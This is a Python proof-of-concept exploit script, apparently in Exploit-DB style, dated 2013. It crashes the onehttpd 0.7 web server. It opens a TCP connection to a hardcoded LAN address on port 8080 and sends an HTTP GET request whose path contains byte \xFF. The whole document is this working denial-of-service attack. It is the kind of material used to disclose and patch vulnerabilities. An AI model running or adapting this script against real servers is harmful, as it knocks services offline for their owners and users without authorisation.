#!/usr/bin/env python
# Exploit Title: onehttpd 0.7 Denial of Service
# Date: 12 Aug 2013
# Exploit Author: superkojiman - http://www.techorganic.com
# Vendor Homepage: https://code.google.com/p/onehttpd/
# Version: onehttpd 0.7
# Tested on: Windows 7 Ultimate English
#            Windows XP SP2 English
#
from socket import *

buf =  ( 
"GET /\xFF HTTP/1.1\r\n" + 
"Host: 192.168.1.143\r\n" + 
"\r\n"
)

s = socket(AF_INET, SOCK_STREAM)
s.connect(("192.168.1.143", 8080))
s.send(buf)
s.close()